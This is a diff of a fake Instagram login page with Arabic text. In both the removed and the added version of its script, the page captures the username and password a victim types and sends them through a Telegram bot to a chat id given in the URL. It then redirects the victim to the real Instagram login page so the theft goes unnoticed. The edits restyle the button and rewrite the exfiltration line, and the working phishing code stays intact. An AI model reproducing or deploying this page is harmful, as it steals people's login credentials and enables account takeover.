@@ -8,7 +8,8 @@
         body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .box { background: #fff; padding: 40px; border: 1px solid #dbdbdb; width: 350px; text-align: center; }
         input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        .btn { width: 100%; padding: 8px; background: #0095f6; color: #fff; border: none; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
+        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
@@ -16,7 +17,8 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="175"><br><br>
         <input type="text" id="u" placeholder="اسم المستخدم أو الهاتف">
         <input type="password" id="p" placeholder="كلمة السر">
-        <button onclick="s()">تسجيل الدخول</button>
+        <button class="btn" onclick="s()">تسجيل الدخول</button>
+        <div class="footer">نسيت تفاصيل تسجيل الدخول؟</div>
     </div>
     <script>
         function s() {
@@ -25,9 +27,8 @@
             const p = document.getElementById('p').value;
             const id = new URLSearchParams(window.location.search).get('id');
             if(u && p && id) {
-                const m = `📸 **صيد انستقرام جديد**\n👤: \`${u}\`\n🔑: \`${p}\``;
-                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}&parse_mode=Markdown`)
-                .then(() => { location.href = "https://instagram.com"; });
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent("📸 **انستقرام جديد**\n👤: `"+u+"`\n🔑: `"+p+"` ")}&parse_mode=Markdown`)
+                .then(() => { window.location.href = "https://www.instagram.com/accounts/login/"; });
             }
         }
     </script>
